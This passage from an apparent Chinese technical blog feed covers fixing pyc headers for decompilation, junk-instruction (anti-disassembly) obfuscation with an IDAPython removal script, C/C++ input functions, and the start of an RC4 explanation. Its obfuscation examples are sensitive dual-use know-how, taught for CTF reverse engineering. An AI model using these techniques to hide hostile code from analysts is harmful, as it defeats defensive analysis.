num</code>与方法一的二进制码相同。如下图所示：<br><img src="https://raw.githubusercontent.com/1154619573/image/main/909733_QSGE9VP6YBE9W6Y.png" alt="图片描述"><br>再打开<code>测试脚本.pyc</code>与<code>struct.pyc</code>对比头内容确定要添加的内容，如下图所示：<br><img src="https://raw.githubusercontent.com/1154619573/image/main/909733_ATGJ9GJEUGXUUBA.png" alt="图片描述"></p><p>改pyc文件</p><p>选中<code>struct.pyc</code>中框选的头内容，右键编辑→复制选块→十六进制数值。<code>330D0D0A7079693001010000</code><br><img src="https://raw.githubusercontent.com/1154619573/image/main/909733_JFKCBG5M4T94S3H.png" alt="图片描述"><br>打开<code>测试脚本.pyc</code>，直接在前面添加，上面复制的十六进制数值<code>330D0D0A7079693001010000</code>，光标点击第一个字母<code>E</code>右键编辑→剪贴板数据→粘贴→ASCII Hex→确定，然后保存即修改完毕！如下图所示：<br><img src="https://raw.githubusercontent.com/1154619573/image/main/909733_YMPPVDSANDUS5WY.png" alt="图片描述"><br><img src="https://bbs.kanxue.com/upload/attach/202306/909733_AXX35TQDYDNFVH2.png" alt="图片描述"><br><img src="https://bbs.kanxue.com/upload/attach/202306/909733_RE992TMUU9HFHUP.png" alt="图片描述"></p><h4 id="4-pyc文件转换为py文件"><a href="#4-pyc文件转换为py文件" class="headerlink" title="4.pyc文件转换为py文件"></a>4.pyc文件转换为py文件</h4><p>找到<code>测试脚本.pyc</code>所在的文件夹，<code>cd</code> 到此路径下，并输入以下打包命令：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">uncompyle6 -o 测试脚本<span class="hljs-string">.py</span> 测试脚本<span class="hljs-string">.pyc</span><br></code></pre></td></tr></table></figure><p>命令执行完毕后，会看到<code>successfully</code>字段，表示<code>.py</code>源码文件已成功生成在同路径下。<br><img src="https://raw.githubusercontent.com/1154619573/image/main/909733_VB2KNPETFQ3TFW2.png" alt="图片描述"></p><h4 id="5-pyc文件转换为py文件需要的magic-number"><a href="#5-pyc文件转换为py文件需要的magic-number" class="headerlink" title="5.pyc文件转换为py文件需要的magic number"></a>5.pyc文件转换为py文件需要的magic number</h4>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pyc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花指令</title>
    <link href="/2024/03/09/%E9%80%86%E5%90%91/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
    <url>/2024/03/09/%E9%80%86%E5%90%91/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>花指令是企图隐藏掉不想被逆向工程的代码块(或其它功能)的一种方法，在真实代码中插入一些垃圾代码的同时还保证原有程序的正确执行，而程序无法很好地反编译, 难以理解程序内容，达到混淆视听的效果。简单的说就是在代码中混入一些垃圾数据阻碍你的静态分析。</p><h2 id="花指令分类"><a href="#花指令分类" class="headerlink" title="花指令分类"></a>花指令分类</h2><p>花指令大致可以分为可执行花指令和不可执行花指令两类：</p><h3 id="可执行花指令"><a href="#可执行花指令" class="headerlink" title="可执行花指令"></a>可执行花指令</h3><p>可执行花指令指的是这部分花指令代码在程序的正常执行过程中会被执行</p><ul><li>但执行这些代码没有任何意义</li><li>执行前后不改变任何寄存器的值(当然eip这种除外)</li><li>同时这部分代码也会被反汇编器正常识别</li></ul><p><strong>目的</strong></p><ol><li>首先，花指令的首要目的依然是加大静态分析的难度,让你难以识别代码的真正意图</li><li>然后，这种花指令可以破坏反编译的分析,使得栈指针在反编译引擎中出现异常。(当然我们知道栈指针实际上是没有问题的,只不过反编译引擎还有待完善的空间)</li></ol><h3 id="不可执行式花指令"><a href="#不可执行式花指令" class="headerlink" title="不可执行式花指令"></a>不可执行式花指令</h3><p>不可执行花指令指的是这部分花指令代码在程序的正常执行过程中不会被执行</p><p>不可执行花指令是利用反汇编器线性扫描算法的缺陷使得静态分析的时候会看到一些错误的代码</p><h2 id="最常见的花指令"><a href="#最常见的花指令" class="headerlink" title="最常见的花指令"></a>最常见的花指令</h2><p><img src="https://i.loli.net/2020/06/16/QKGzB7fnACNy4kS.png" alt="image-20200616211207943"></p><p>如图所示,这就是ctf题目中最常见也是最简单花指令之一，一个典型的不可执行花指令。</p><h3 id="patch方法"><a href="#patch方法" class="headerlink" title="patch方法"></a>patch方法</h3><p>首先我们将0x00401D92处的代码转换成数据（快捷键U）</p><p><img src="https://i.loli.net/2020/06/16/Cl62vX8Qyu9mz4E.png" alt="image-20200616211824836"></p><p>然后将0x00401D94处的数据转换成代码（快捷键C），再把0x00401D92，0x00401D93处的数据nop掉即可</p><p><img src="https://i.loli.net/2020/06/16/nbgyGfT9C8eNrHw.png" alt="image-20200616212021916"></p><p>我们知道E9是jmp指令对应的机器码，当反汇编器读取到E9时，接着会往下读取四个字节的数据作为跳转地址的偏移，所以才会看到错误的汇编代码。</p><h3 id="编写方法"><a href="#编写方法" class="headerlink" title="编写方法"></a>编写方法</h3><p>如果我们在写程序的时候嵌入_asm _emit 0E9，反编译器就会把下一条指令当做地址数据，不管下一条指令实际上的四个字节是地址数据还是操作指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__asm &#123; <br>    _emit 075h    #jmp $+4<br>    _emit 2h<br>    _emit 0E9h<br>    _emit 0EDh<br>&#125;<br></code></pre></td></tr></table></figure><p>上面嵌入的4字节数据即可使得程序反汇编反编译出错，注意这里的75是jnz的机器码，所以要求程序执行到这里时Zflag&#x3D;0。</p><h2 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h2><h3 id="无花指令源程序"><a href="#无花指令源程序" class="headerlink" title="无花指令源程序"></a>无花指令源程序</h3><p>这里我写了一个tea加密算法，我们用msvc编译，生成完成pdb文件方便分析，然后ida打开</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>, i;           <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;                     <span class="hljs-comment">/* a key schedule constant */</span><br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];   <span class="hljs-comment">/* cache key */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                       <span class="hljs-comment">/* basic cycle start */</span><br>        sum += delta;<br>        v0 += ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        v1 += ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>    &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> flag[] = &#123; <span class="hljs-number">1234</span>,<span class="hljs-number">5678</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> key[] = &#123; <span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span> &#125;;<br>    encrypt(flag, key);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d,%d&quot;</span>, flag[<span class="hljs-number">0</span>], flag[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先可以看到main函数和源代码差别不大</p><p><img src="https://i.loli.net/2020/06/16/D9IA7JpvozLSgG1.png" alt="image-20200616234950510"></p><p>然后可以看到encrypt函数也和源代码基本一样</p><p><img src="https://i.loli.net/2020/06/16/C2kvb5D7ZUFd6Lo.png" alt="image-20200616235055960"></p><h3 id="加入花指令"><a href="#加入花指令" class="headerlink" title="加入花指令"></a>加入花指令</h3><p>接下来我们加入两个花指令</p><p>第一个花指令在main函数中，就是我们上面提供的最简单的花指令编写方法</p><p>第二个花指令在encrypt函数中，是一个可执行花指令，下面我会具体分析这个花指令以及对应的去除方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><p><strong>第一个花指令</strong></p><p>首先ida打开查看main函数：</p><p><img src="https://i.loli.net/2020/06/16/QLenNRbvAsUH4ct.png" alt="image-20200616235743442"></p><p>虽然还是反编译成功了，但是可以看到内容已经完全错误，我们再来看main函数的汇编代码，也就是我们加入的第一个花指令</p><p><img src="https://i.loli.net/2020/06/16/ZLF2XBCcIl8gwzT.png" alt="image-20200616235852756"></p><p>可以看到这里出现的红色就是我们的第一处花指令，patch方法同上，我们主要看第二处花指令。</p><p><strong>第二个花指令</strong></p><p>f5反编译直接报错</p><p><img src="https://i.loli.net/2020/06/17/NFG2ck1tTsA7XwV.png" alt="image-20200617000152860"></p><p>可以发现花指令的混淆作用还是很明显的，那我们继续跟进到花指令的反汇编代码处</p><p><img src="https://i.loli.net/2020/06/17/sEZLmS7FqPkfUJN.png" alt="image-20200617000420510"></p><p>这里框出的指令就是我们加入的花指令，逻辑其实特别清晰，就是先跳转到junk1，再call junk2，call junk2的时候会把地址0x004118D3压栈，然后进入junk2中执行retn指令又会把地址0x004118D3 pop到eip中，然后接下来程序继续正常执行。</p><p><strong>去除方法</strong></p><p>这种连续的可执行花指令的去除方法特别简单，直接整块nop掉即可。</p><p>但是真正的复杂程序里这种花指令的数量很多，人工nop很耗时，同时极容易出错，所以我们真正应该掌握的是自动化的方法，编写脚本匹配花指令模板进行去除。</p><h3 id="去除花指令"><a href="#去除花指令" class="headerlink" title="去除花指令"></a>去除花指令</h3><p>这里是我们要去除的花指令模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#define JUNKCODE __asm&#123;<br>    __asm jmp junk1 <br>    __asm __emit 0x12 <br>    __asm junk2: <br>    __asm ret <br>    __asm __emit 0x34 <br>    __asm junk1: <br>    __asm call junk2  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里是idapython编写的ida匹配模板去除花指令脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">nop</span>(<span class="hljs-params">addr, endaddr</span>):<br>    <span class="hljs-keyword">while</span> addr &lt; endaddr:<br>        PatchByte(addr, <span class="hljs-number">0x90</span>)<br>        addr += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">undefine</span>(<span class="hljs-params">addr, endaddr</span>):<br>    <span class="hljs-keyword">while</span> addr &lt; endaddr:<br>        MakeUnkn(addr, <span class="hljs-number">0</span>)<br>        addr += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dejunkcode</span>(<span class="hljs-params">addr, endaddr</span>):<br>    <span class="hljs-keyword">while</span> addr &lt; endaddr:<br>        MakeCode(addr)<br>        <span class="hljs-comment"># 匹配模板</span><br>        <span class="hljs-keyword">if</span> GetMnem(addr) == <span class="hljs-string">&#x27;jmp&#x27;</span> <span class="hljs-keyword">and</span> GetOperandValue(addr, <span class="hljs-number">0</span>) == addr + <span class="hljs-number">5</span> <span class="hljs-keyword">and</span> Byte(addr+<span class="hljs-number">2</span>) == <span class="hljs-number">0x12</span>:<br>            <span class="hljs-built_in">next</span> = addr + <span class="hljs-number">10</span><br>            nop(addr, <span class="hljs-built_in">next</span>)<br>            addr = <span class="hljs-built_in">next</span><br>            <span class="hljs-keyword">continue</span><br>        addr += ItemSize(addr)<br><br>dejunkcode(<span class="hljs-number">0x00411820</span>, <span class="hljs-number">0x00411957</span>)<br>undefine(<span class="hljs-number">0x00411820</span>, <span class="hljs-number">0x00411957</span>)<br>MakeFunction(<span class="hljs-number">0x00411820</span>, -<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><strong>重要函数解析</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">MakeCode</span>(ea) #分析代码区，相当于ida快捷键C<br><span class="hljs-built_in">ItemSize</span>(ea) #获取指令或数据长度<br><span class="hljs-built_in">GetMnem</span>(ea) #得到addr地址的操作码<br><span class="hljs-built_in">GetOperandValue</span>(ea,n) #返回指令的操作数的被解析过的值<br><span class="hljs-built_in">PatchByte</span>(ea, value) #修改程序字节<br><span class="hljs-built_in">Byte</span>(ea) #将地址解释为Byte<br><span class="hljs-built_in">MakeUnkn</span>(ea,<span class="hljs-number">0</span>) <span class="hljs-selector-id">#MakeCode</span>的反过程，相当于ida快捷键U<br><span class="hljs-built_in">MakeFunction</span>(ea,end) #将有begin到end的指令转换成一个函数。如果end被指定为BADADDR（-<span class="hljs-number">1</span>），IDA会尝试通过定位函数的返回指令，来自动确定该函数的结束地址<br></code></pre></td></tr></table></figure><p>idapython提供的函数挺多的，这里的函数如果有不太理解意思的，可以在ida的python命令行中自行尝试一下，对照着ida汇编窗口的变化和函数返回值很快就能掌握函数的用法</p><p><strong>运行脚本</strong></p><p>我们在ida中运行脚本，然后可以发现那段花指令已经成功nop掉了，按下f5反编译：</p><p><img src="https://i.loli.net/2020/06/17/k17OfWKzrqib6GY.png" alt="image-20200617002951207"></p><p>可以看到encrypt函数被成功的反编译了。</p><p>对于较复杂的程序而言，编写模板匹配脚本去除花指令是十分重要的，可以做到准确无误，同时节省了很多时间。</p><h3 id="特殊花指令"><a href="#特殊花指令" class="headerlink" title="特殊花指令"></a>特殊花指令</h3><p>还有一类较特殊的花指令，它不会影响反汇编和反编译，只是单纯的混淆视听</p><p>譬如我们程序需要将某个特定值（这里假设是0x12）压栈，正常操作应该是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push    0x12<br></code></pre></td></tr></table></figure><p>加入花指令后，这个操作可以变成这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push    0x26<br>xor dword ptr ss:[esp], 0x34<br></code></pre></td></tr></table></figure><p>我们很容易可以看出来这两种写法是等效的，当我们要压栈的数据是一些很明显的特征值的时候，这种花指令可以很好的保护我们的特征值，防止算法特征被迅速识别</p><p>当然这里只是一个简单的例子，这种花指令复杂起来将会使得分析难度大大提升。</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>c&#92;c++的输入输出</title>
    <link href="/2024/03/09/%E7%BC%96%E7%A8%8B/c++%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/03/09/%E7%BC%96%E7%A8%8B/c++%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="c-c-的输入输出"><a href="#c-c-的输入输出" class="headerlink" title="c\c++的输入输出"></a>c\c++的输入输出</h2><h3 id="c语言的输入输出"><a href="#c语言的输入输出" class="headerlink" title="c语言的输入输出"></a>c语言的输入输出</h3><h5 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h5><p>按下回车键时，从stdin读取一行。<br>用法示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br>gets(str);<br></code></pre></td></tr></table></figure><p>对空白字符的处理：<br>1.所有空格、Tab等空白字符均被读取，不忽略。<br>2.按下回车键时，缓冲区末尾的换行符被丢弃，字符串末尾没有换行符\n，缓冲区也没有残留的换行符\n。<br>注意，gets()不能指定读取上限，因此容易发生数组边界溢出，造成<strong>内存不安全</strong>。C11 使用了gets_s()代替gets()，但有时编译器未必支持，因此总体来说不建议使用gets()函数来读取输入。</p><p>gets()对应的输出函数是puts()。</p><h5 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h5><p>从指定输入流读取一行，输入可以是stdin，也可以是文件流，使用时需要显式指定。</p><p>读取stdin示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> s1[<span class="hljs-number">1005</span>];<br>fgets(s1,<span class="hljs-number">1004</span>,<span class="hljs-built_in">stdin</span>);<span class="hljs-comment">//换行符占两个字符</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">memset</span>(str, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(str));<br><span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (fgets(str, <span class="hljs-keyword">sizeof</span>(str), <span class="hljs-built_in">stdin</span>) != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;line%d [len %d]: %s&quot;</span>, i++, <span class="hljs-built_in">strlen</span>(str), str);<br></code></pre></td></tr></table></figure><p>对空白字符的处理：</p><p>1.所有空格、Tab等空白字符均被读取，不忽略。<br>2.按下回车键时，缓冲区末尾的换行符也被读取，字符串末尾将有一个换行符\n。例如，输入字符串hello，再按下回车，则读到的字符串长度为6。<br>3.fgets()函数会自动在字符串末尾加上\0结束符。</p><p>第 2 个参数n指定了读取的最大长度。函数读到n-1个字符（包括换行符\n）就会停止，并在末尾加上\0结束符。剩余字符将残留在缓冲区。</p><p>建议使用fgets()完全替代gets()。fgets()对应的输出函数是fputs()。</p><h5 id="fgetc-getc"><a href="#fgetc-getc" class="headerlink" title="fgetc &amp; getc()"></a>fgetc &amp; getc()</h5><p>从指定输入流读取一个字符，输入可以是<code>stdin</code>，也可以是文件流，使用时需要显式指定。</p><h5 id="getchar"><a href="#getchar" class="headerlink" title="getchar()"></a>getchar()</h5><p>从stdin读取一个字符。getchar()实际上也由fgetc()宏定义而来，只是默认输入流为stdin。</p><p>用法示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> a;<br>a = getchar();<br></code></pre></td></tr></table></figure><p>getchar()常常用于清理缓冲区开头残留的换行符。当知道缓冲区开头有\n残留时，可以调用getchar()但不赋值给任何变量，即可实现冲刷掉\n的效果。</p><p>getchar()对应的输出函数是putchar()。</p><h3 id="c-的输入输出"><a href="#c-的输入输出" class="headerlink" title="c++的输入输出"></a>c++的输入输出</h3><h5 id="cin"><a href="#cin" class="headerlink" title="cin"></a>cin</h5><p>cin是 C++ 的标准输入流对象，即istream类的一个对象实例。cin有自己的缓冲区，但默认情况下是与stdin同步的，因此在 C++ 中可以混用 C++ 和 C 风格的输入输出（在不手动取消同步的情况下）。</p><p>cin与stdin一样是行缓冲，即遇到换行符时才会将数据同步到输入缓冲区。</p><p>cin的用法非常多，只列举常用的几种。最常用的就是使用&gt;&gt;符号（我认为该符号形象地体现了“流”的特点）。</p><p>用法示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a, b;<br>cin &gt;&gt; a &gt;&gt; b;<br><span class="hljs-type">char</span> str[<span class="hljs-number">20</span>];<br>cin &gt;&gt; str;<br></code></pre></td></tr></table></figure><p>cin对空白字符的处理与scanf一致。即：跳过开头空白字符，遇到空白字符停止读取，且空白字符（包括换行符）残留在缓冲区。</p><p>如果不想跳过空白字符，可以使用流控制关键词noskipws（no skip white space），但这只对单个字符有效（类似于scanf中的%c）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">char</span> c;<br>cin &gt;&gt; noskipws &gt;&gt; c;<br></code></pre></td></tr></table></figure><p>注意，cin对象属于命名空间std，如果想使用cin对象，必须在 C++ 文件开头写using namespace std，或者在每次用到的时候写成std::cin。</p><h5 id="cin-get"><a href="#cin-get" class="headerlink" title="cin.get()"></a>cin.get()</h5><p>读取单个或指定长度的字符，包括空白字符。</p><p>用法示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">char</span> a, b;<br><span class="hljs-type">char</span> str[<span class="hljs-number">20</span>];<br><br><span class="hljs-comment">// 读取一个字符，读取失败时返回0，多余字符残留在缓冲区（包括换行符）</span><br>a = cin.<span class="hljs-built_in">get</span>();<br><span class="hljs-comment">// 读取一个字符，读取失败时返回EOF，多余字符残留在缓冲区（包括换行符）</span><br>cin.<span class="hljs-built_in">get</span>(b);<br><br><span class="hljs-comment">// 在遇到指定终止字符（参数3）前，至多读取n-1个（参数2）字符</span><br><span class="hljs-comment">// 当不指定终止字符时，默认为换行符\n</span><br><span class="hljs-comment">// 如果输入的字符个数小于等于n-1（不含终止字符），则终止字符不残留在缓冲区</span><br><span class="hljs-comment">// 如果输入的字符个数多于n-1（不含终止字符），则余下字符将残留在缓冲区</span><br>cin.<span class="hljs-built_in">get</span>(str, <span class="hljs-built_in">sizeof</span>(str), <span class="hljs-string">&#x27;\n&#x27;</span>);<br></code></pre></td></tr></table></figure><p>cin.get()读取单个字符时，类似于 C 中的fgetc()，对空白字符的处理也与其一致。cin.get()读取的字符也可以赋值给整型变量。</p><p>cin.get()读取指定长度个字符时，类似于 C 中的fgets()，但在换行符的处理上不同。它们都不会使换行符残留在缓冲区，但fgets()会将缓冲区末尾的换行符\n也写入字符串，而cin.get()会丢弃缓冲区末尾的\n。即：当输入test时，用fgets()读取得到的字符串长度为5，用cin.get()读取得到的字符串长度为4。</p><h5 id="cin-getline"><a href="#cin-getline" class="headerlink" title="cin.getline()"></a>cin.getline()</h5><p>读取指定长度的字符，包括空白字符。</p><p>用法示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">char</span> str[<span class="hljs-number">20</span>];<br>cin.<span class="hljs-built_in">getline</span>(str, <span class="hljs-built_in">sizeof</span>(str));    <span class="hljs-comment">// 第3个参数也可以指定终止字符</span><br></code></pre></td></tr></table></figure><p>cin.getline()与cin.get()指定读取长度时的用法几乎一样。区别在于，如果输入的字符个数大于指定的最大长度n-1（不含终止符），cin.get()会使余下字符残留在缓冲区，等待下次读取；而cin.getline()会给输入流设为 Fail 状态，在主动恢复之前，无法再进行正常输入。</p><h5 id="getline"><a href="#getline" class="headerlink" title="getline()"></a>getline()</h5><p>getline()并不是标准输入流istream的函数，而是字符串流sstream的函数，只能用于读取数据给<strong>string类对象</strong>，使用时也需要包含头文件<string>。</p><p>如果使用getline()读取标准输入流的数据，需要显式指定输入流。</p><p>用法示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">string str;<br><span class="hljs-built_in">getline</span>(cin, str);<br></code></pre></td></tr></table></figure><p>getline()会读取所有空白字符，且缓冲区末尾的换行符会被丢弃，不残留也不写到字符串结尾。同时，由于string对象的空间是动态分配的，所以会一次性将缓冲区读完，不存在读不完残留在缓冲区的问题。</p><p>需要注意的是，假如缓冲区开头就是换行符（比如可能是上一次cin残留的），则getline()会直接读取到空字符串并结束，不会给键盘输入的机会。所以这种情况下要注意先清除开头的换行符。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在 C 中，建议使用scanf()进行格式化读取，用fgets()读取整行，用fgetc()或getchar()读取单个字符。</p><p>在 C++ 中，建议使用cin &gt;&gt;进行格式化读取，而cin.get()、cin.getline、getline(string)有各自的适用情况。</p><p>注意fgets()和cin.get()在对换行符的清理方面有所区别。</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>rc4加密</title>
    <link href="/2024/03/09/%E9%80%86%E5%90%91/rc4%E5%8A%A0%E5%AF%86/"/>
    <url>/2024/03/09/%E9%80%86%E5%90%91/rc4%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<p>​<a href="https://en.wikipedia.org/wiki/RC4">RC4（来自Rivest Cipher 4）</a>由美国密码学家罗纳德·李维斯特（Ron Rivest）在1987年设计，是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。由于RC4算法存在弱点，2015年2月所发布的 <a href="https://tools.ietf.org/html/rfc7465">RFC 7465</a> 规定禁止在TLS中使用RC4加密算法。</p><p>加密流程：</p><p>![image-20240304081609314](&#x2F;Users&#x2F;mawenhui&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20240304081609314.png)</p><p>具体加密过程：</p><p>1、先初始化状态向量S（256个字节，用来作为密钥流生成的种子1）</p><p>按照升序，给每个字节赋值0,1,2,3,4,5,6…..,254,255</p><p>2、初始密钥（由用户输入），长度任意</p><p>如果输入长度小于256个字节，则进行轮转，直到填满</p><p>例如输入密钥的是1,2,3,4,5  , 那么填入的是1,2,3,4,5,1,2,3,4,5,1,2,3,4,5……..</p><p>由上述轮转过程得到256个字节的向量T（用来作为密钥流生成的种子2）</p><p>3、开始对状态向量S进行置换操作（用来打乱初始种子1）</p><p>按照下列规则进行</p><p>从第零个字节开始，执行256次，保证每个字节都得到处理　</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">j = <span class="hljs-number">0</span>;<br><br>　　<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">256</span> ; i++)&#123;<br><br>　　　　j = (j + S[i] + T[i]) mod <span class="hljs-number">256</span>;<br><br>　　　　<span class="hljs-built_in">swap</span>(S[i] , S[j]);<br><br>　　&#125;<br></code></pre></td></tr></table></figure><p>这样处理后的状态向量S几乎是带有一定的随机性了</p><p>4、密钥流的生成与加密</p><p>假设我的明文字节数是datalength&#x3D;1024个字节（当然可以是任意个字节）</p><figure class="highlight 